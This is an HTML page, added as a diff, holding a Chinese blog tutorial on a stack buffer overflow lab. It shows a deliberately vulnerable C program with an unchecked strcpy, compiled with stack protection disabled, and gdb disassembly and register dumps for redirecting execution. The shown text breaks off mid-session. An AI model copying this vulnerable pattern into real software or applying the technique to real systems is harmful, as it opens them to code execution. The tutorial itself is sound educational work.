@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.4.1',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="缓冲区溢出是指向程序缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被攻击者利用来改变程序的流程控制，甚至执行代码的任意片段。缓冲区溢出攻击成为远程攻击的主要手段，攻击者利用缓冲区溢出漏洞可以植入并且执行任意的攻击代码，缓冲区溢出漏洞给予了攻击者想要的一切，甚至得到被攻击计算机的控制权。">
+<meta name="keywords" content="逆向 汇编 实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓冲区溢出攻击实验">
+<meta property="og:url" content="https://www.lanshiqin.com/e2f22ec7/index.html">
+<meta property="og:site_name" content="蓝士钦">
+<meta property="og:description" content="缓冲区溢出是指向程序缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被攻击者利用来改变程序的流程控制，甚至执行代码的任意片段。缓冲区溢出攻击成为远程攻击的主要手段，攻击者利用缓冲区溢出漏洞可以植入并且执行任意的攻击代码，缓冲区溢出漏洞给予了攻击者想要的一切，甚至得到被攻击计算机的控制权。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://www.lanshiqin.com/e2f22ec7/overflow.png">
+<meta property="og:image" content="https://www.lanshiqin.com/e2f22ec7/1.png">
+<meta property="og:image" content="https://www.lanshiqin.com/e2f22ec7/2.png">
+<meta property="og:image" content="https://www.lanshiqin.com/e2f22ec7/3.png">
+<meta property="og:image" content="https://www.lanshiqin.com/e2f22ec7/4.png">
+<meta property="og:image" content="https://www.lanshiqin.com/e2f22ec7/5.png">
+<meta property="og:updated_time" content="2018-09-23T13:08:37.454Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="缓冲区溢出攻击实验">
+<meta name="twitter:description" content="缓冲区溢出是指向程序缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被攻击者利用来改变程序的流程控制，甚至执行代码的任意片段。缓冲区溢出攻击成为远程攻击的主要手段，攻击者利用缓冲区溢出漏洞可以植入并且执行任意的攻击代码，缓冲区溢出漏洞给予了攻击者想要的一切，甚至得到被攻击计算机的控制权。">
+<meta name="twitter:image" content="https://www.lanshiqin.com/e2f22ec7/overflow.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="蓝士钦" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://www.lanshiqin.com/e2f22ec7/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>缓冲区溢出攻击实验 | 蓝士钦</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">蓝士钦</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">编程是一种信仰</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.lanshiqin.com/e2f22ec7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="蓝士钦">
+      <meta itemprop="description" content="蓝士钦">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="蓝士钦">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">缓冲区溢出攻击实验
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-02-10 15:20:57" itemprop="dateCreated datePublished" datetime="2018-02-10T15:20:57+08:00">2018-02-10</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-09-23 21:08:37" itemprop="dateModified" datetime="2018-09-23T21:08:37+08:00">2018-09-23</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/实验/" itemprop="url" rel="index"><span itemprop="name">实验</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <img src="/e2f22ec7/overflow.png" title="overflow">
+<blockquote>
+<p>缓冲区溢出是指向程序缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被攻击者利用来改变程序的流程控制，甚至执行代码的任意片段。缓冲区溢出攻击成为远程攻击的主要手段，攻击者利用缓冲区溢出漏洞可以植入并且执行任意的攻击代码，缓冲区溢出漏洞给予了攻击者想要的一切，甚至得到被攻击计算机的控制权。</p>
+</blockquote>
+<a id="more"></a>
+<p>缓冲区溢出漏洞能够被利用的主要原因是计算机采用了“<code>冯·诺依曼体系结构</code>”，该体系结构把程序指令也当做数据来对待，指令和数据不加区分混合存储在同一个存储器中，数据和程序在内存中是没有区别的,它们都是内存中的数据,当EIP指针指向哪 CPU就加载那段内存中的数据。这就造成数据存在覆盖指令的情况，<font color="red" face="黑体">如果数据指向一个内存地址并且覆盖了EIP指针所指向的地址，那么程序就会跳转到攻击者指定的代码段执行。</font></p>
+<h2 id="概念部分："><a href="#概念部分：" class="headerlink" title="概念部分："></a>概念部分：</h2><p>计算机程序被CPU执行前需要先被载入内存，程序所在的内存由操作系统进行分配，程序内部使用的变量或者接收用户输入的数据都需要分配内存，这块内存区域也叫做缓冲区，程序被载入到内存后的结构如下图绿色区域所示：<br><img src="/e2f22ec7/1.png" title="overflow"><br>一个程序占用着一块内存区域，这块区域包含了程序函数的调用栈，数据，缓冲区等。如果向缓冲区写入超出长度的数据，那么数据将会覆盖到程序的其他内存区域，如果函数调用栈里某个函数地址被覆盖成其他函数地址，那么这个程序执行流程将会被改变，将会执行覆盖数据指定地址的函数。更为严重的是如果被植入精心构造的恶意代码并执行，攻击者将会得到运行该程序的用户权限，如果该程序以root角色执行，那么攻击者就可以得到目标计算机的完全控制权。</p>
+<h2 id="要做的事："><a href="#要做的事：" class="headerlink" title="要做的事："></a>要做的事：</h2><ol>
+<li>用C语言编写一个具有缓冲区溢出漏洞的程序，程序的功能是从main函数参数接收用户输入的数据，并且输出到控制台。</li>
+<li>使用gcc将源代码编译成32位的可执行程序，并使用gdb调试并断点分析程序运行。</li>
+<li>运行程序并向程序输入超过缓冲区大小的数据，对第二步调试分析得到的目标函数地址进行覆盖，将函数地址覆盖成另一个函数地址，使程序执行其他函数。</li>
+</ol>
+<h2 id="使用的系统和工具："><a href="#使用的系统和工具：" class="headerlink" title="使用的系统和工具："></a>使用的系统和工具：</h2><ol>
+<li>Ubuntu Linux 16.04（64位）操作系统</li>
+<li>vim,gcc,gdb,gcc-multilib(32位程序所需的编译工具)<br>其中gcc和gdb在Ubuntu中已经内置，vim和编译32位程序所需的gcc编译器需要另外安装<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br><span class="line">sudo apt-get install gcc-multilib</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="实验部分："><a href="#实验部分：" class="headerlink" title="实验部分："></a>实验部分：</h2><p>使用vim新建一个main.c 源代码文件<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str = argv[<span class="number">1</span>];</span><br><span class="line">    fun(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上面的代码通过main()函数参数接收用户输入数据，并调用fun()函数将输入的数据str拷贝给buf缓冲区，最后将buf缓冲区的字符输出。<br>可以看到上面的代码定义了一个字符数组为10个字节大小的buf缓冲区，并使用strcpy将str数据直接拷贝到buf缓冲区，并没有对数据长度进行判断，<font color="red" size="5" face="黑体">如果用户输入了超过10个字符的数据，那么将会产生缓冲区溢出。</font></p>
+<p><font color="blue" size="5" face="黑体"><br>上面的代码并没有调用函数hello(),我们可以利用缓冲区漏洞，让程序调用函数hello()。<br></font><br>使用gcc将源代码编译成可执行程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z execstack -fno-stack-protector -g -o main main.c</span><br></pre></td></tr></table></figure></p>
+<p>为了方便实验进行，上面的gcc编译指令后面跟了一些编译参数：</p>
+<ol>
+<li>-m32 将程序编译成32位程序</li>
+<li>-z execstack 允许栈执行</li>
+<li>-fno-stack-protector 关闭gcc的Stack Guard</li>
+<li>-g 为了gdb程序能够调试程序（方便后续的结合源代码断点调试）</li>
+<li>-o 输出目标文件为指定文件</li>
+</ol>
+<p>编译后可以看到已经生成了可执行程序 main, 输入命令运行程序 并且后面跟上参数AAAA<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./main AAAA</span><br></pre></td></tr></table></figure></p>
+<p>可以看到控制台成功输出了输入的AAAA<br><img src="/e2f22ec7/2.png" title="overflow"></p>
+<p>如果用户输入超过长度的字符，发现程序执行后会报段错误<br><img src="/e2f22ec7/3.png" title="overflow"></p>
+<p>接下来使用gdb调试目标程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./main</span><br></pre></td></tr></table></figure></p>
+<p>在gdb模式下,可以使用disass命令查看程序中各个函数的汇编代码<br>依次查看程序中的 hello()函数 fun()函数  main()函数的汇编代码<br><img src="/e2f22ec7/4.png" title="overflow"></p>
+<p>汇编代码如下所示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass hello</span><br><span class="line">Dump of assembler code for function hello:</span><br><span class="line">   0x0804843b &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x0804843c &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x0804843e &lt;+3&gt;:	sub    $0x8,%esp</span><br><span class="line">   0x08048441 &lt;+6&gt;:	sub    $0xc,%esp</span><br><span class="line">   0x08048444 &lt;+9&gt;:	push   $0x8048540</span><br><span class="line">   0x08048449 &lt;+14&gt;:	call   0x8048310 &lt;puts@plt&gt;</span><br><span class="line">   0x0804844e &lt;+19&gt;:	add    $0x10,%esp</span><br><span class="line">   0x08048451 &lt;+22&gt;:	nop</span><br><span class="line">   0x08048452 &lt;+23&gt;:	leave  </span><br><span class="line">   0x08048453 &lt;+24&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass fun</span><br><span class="line">Dump of assembler code for function fun:</span><br><span class="line">   0x08048454 &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08048455 &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048457 &lt;+3&gt;:	sub    $0x18,%esp</span><br><span class="line">   0x0804845a &lt;+6&gt;:	sub    $0x8,%esp</span><br><span class="line">   0x0804845d &lt;+9&gt;:	pushl  0x8(%ebp)</span><br><span class="line">   0x08048460 &lt;+12&gt;:	lea    -0x12(%ebp),%eax</span><br><span class="line">   0x08048463 &lt;+15&gt;:	push   %eax</span><br><span class="line">   0x08048464 &lt;+16&gt;:	call   0x8048300 &lt;strcpy@plt&gt;</span><br><span class="line">   0x08048469 &lt;+21&gt;:	add    $0x10,%esp</span><br><span class="line">   0x0804846c &lt;+24&gt;:	sub    $0xc,%esp</span><br><span class="line">   0x0804846f &lt;+27&gt;:	lea    -0x12(%ebp),%eax</span><br><span class="line">   0x08048472 &lt;+30&gt;:	push   %eax</span><br><span class="line">   0x08048473 &lt;+31&gt;:	call   0x8048310 &lt;puts@plt&gt;</span><br><span class="line">   0x08048478 &lt;+36&gt;:	add    $0x10,%esp</span><br><span class="line">   0x0804847b &lt;+39&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x08048480 &lt;+44&gt;:	leave  </span><br><span class="line">   0x08048481 &lt;+45&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x08048482 &lt;+0&gt;:	lea    0x4(%esp),%ecx</span><br><span class="line">   0x08048486 &lt;+4&gt;:	and    $0xfffffff0,%esp</span><br><span class="line">   0x08048489 &lt;+7&gt;:	pushl  -0x4(%ecx)</span><br><span class="line">   0x0804848c &lt;+10&gt;:	push   %ebp</span><br><span class="line">   0x0804848d &lt;+11&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x0804848f &lt;+13&gt;:	push   %ecx</span><br><span class="line">   0x08048490 &lt;+14&gt;:	sub    $0x14,%esp</span><br><span class="line">   0x08048493 &lt;+17&gt;:	mov    %ecx,%eax</span><br><span class="line">   0x08048495 &lt;+19&gt;:	mov    0x4(%eax),%eax</span><br><span class="line">   0x08048498 &lt;+22&gt;:	mov    0x4(%eax),%eax</span><br><span class="line">   0x0804849b &lt;+25&gt;:	mov    %eax,-0xc(%ebp)</span><br><span class="line">   0x0804849e &lt;+28&gt;:	sub    $0xc,%esp</span><br><span class="line">   0x080484a1 &lt;+31&gt;:	pushl  -0xc(%ebp)</span><br><span class="line">   0x080484a4 &lt;+34&gt;:	call   0x8048454 &lt;fun&gt;</span><br><span class="line">   0x080484a9 &lt;+39&gt;:	add    $0x10,%esp</span><br><span class="line">   0x080484ac &lt;+42&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x080484b1 &lt;+47&gt;:	mov    -0x4(%ebp),%ecx</span><br><span class="line">   0x080484b4 &lt;+50&gt;:	leave  </span><br><span class="line">   0x080484b5 &lt;+51&gt;:	lea    -0x4(%ecx),%esp</span><br><span class="line">   0x080484b8 &lt;+54&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到其中hello函数的首地址是 <code>0x0804843b</code>，缓冲区溢出的时候会用到<code>0x0804843b</code>。<br>除此之外还可以看到main函数调用fun函数call的地址是<code>0x080484a4</code>,<br>call后的下面一条指令地址是<code>0x080484a9</code>，这些指令地址都将会放在CPU寄存器里，待会断点调试的时候可以看到。</p>
+<p>输入l命令列出程序源码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) l</span><br><span class="line">5	&#123;</span><br><span class="line">6	    <span class="built_in">printf</span>(<span class="string">"hello\n"</span>);</span><br><span class="line">7	&#125;</span><br><span class="line">8	</span><br><span class="line">9	int fun(char *str)</span><br><span class="line">10	&#123;</span><br><span class="line">11	    char buf[10];</span><br><span class="line">12	    strcpy(buf, str);</span><br><span class="line">13	    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">14	    <span class="built_in">return</span> 0;</span><br><span class="line">(gdb) </span><br><span class="line">15	&#125;</span><br><span class="line">16	</span><br><span class="line">17	int main(int argc, char **argv)</span><br><span class="line">18	&#123;</span><br><span class="line">19	    char *str = argv[1];</span><br><span class="line">20	    fun(str);</span><br><span class="line">21	    <span class="built_in">return</span> 0;</span><br><span class="line">22	&#125;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
+<p>使用 b命令进行断点，我们将断点设置在13行和20行，看看调用fun函数时和printf输出时寄存器内的数据。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b 13</span><br><span class="line">Breakpoint 1 at 0x804846c: file main.c, line 13.</span><br><span class="line">(gdb) b 20</span><br><span class="line">Breakpoint 2 at 0x804849e: file main.c, line 20.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
+<p>输入数据AAAA运行，查看寄存器ebp和esp的数据:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r AAAA</span><br><span class="line">Starting program: /home/lanshiqin/桌面/main AAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=2, argv=0xffffd084) at main.c:20</span><br><span class="line">20	    fun(str);</span><br><span class="line">(gdb) x/x <span class="variable">$ebp</span></span><br><span class="line">0xffffcfd8:	0x00000000</span><br><span class="line">(gdb) x/8x <span class="variable">$esp</span></span><br><span class="line">0xffffcfc0:	0x00000002	0xffffd084	0xffffd090	0xffffd289</span><br><span class="line">0xffffcfd0:	0xf7fb83dc	0xffffcff0	0x00000000	0xf7e20637</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到程序先执行到了fun函数所在的断点位置，此时fun函数接收的参数str应该是输入的数据AAAA<br>使用p命令查看str的地址<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p str</span><br><span class="line"><span class="variable">$1</span> = 0xffffd289 <span class="string">"AAAA"</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
+<p>使用si命令单步运行，然后查看寄存器数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) si</span><br><span class="line">0x080484a1	20	    fun(str);</span><br><span class="line">(gdb) x/8x <span class="variable">$esp</span></span><br><span class="line">0xffffcfb4:	0x00000001	0xf7e36830	0x0804850b	0x00000002</span><br><span class="line">0xffffcfc4:	0xffffd084	0xffffd090	0xffffd289	0xf7fb83dc</span><br><span class="line">(gdb) si</span><br><span class="line">0x080484a4	20	    fun(str);</span><br><span class="line">(gdb) x/8x <span class="variable">$esp</span></span><br><span class="line">0xffffcfb0:	0xffffd289	0x00000001	0xf7e36830	0x0804850b</span><br><span class="line">0xffffcfc0:	0x00000002	0xffffd084	0xffffd090	0xffffd289</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到str地址`0xffffd289’已经压入栈中<br>继续si单步运行，查看寄存器数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) si</span><br><span class="line">fun (str=0xffffd289 <span class="string">"AAAA"</span>) at main.c:10</span><br><span class="line">10	&#123;</span><br><span class="line">(gdb) x/8x <span class="variable">$esp</span></span><br><span class="line">0xffffcfac:	0x080484a9	0xffffd289	0x00000001	0xf7e36830</span><br><span class="line">0xffffcfbc:	0x0804850b	0x00000002	0xffffd084	0xffffd090</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+<p>可以看到call后面的一条指令地址<code>0x080484a9</code>也已经压入栈中<br>使用n单步运行，到达13行断点位置，查看寄存器内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) n</span><br><span class="line">12	    strcpy(buf, str);</span><br><span class="line">(gdb) n</span><br><span class="line"></span><br><span class="line">Breakpoint 1, fun (str=0xffffd289 <span class="string">"AAAA"</span>) at main.c:13</span><br><span class="line">13	    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">(gdb) x/8x <span class="variable">$esp</span></span><br><span class="line">0xffffcf90:	0xffffffff	0x4141002f	0xf7004141	0xf7fd41a8</span><br><span class="line">0xffffcfa0:	0x00008000	0xf7fb8000	0xffffcfd8	0x080484a9</span><br><span 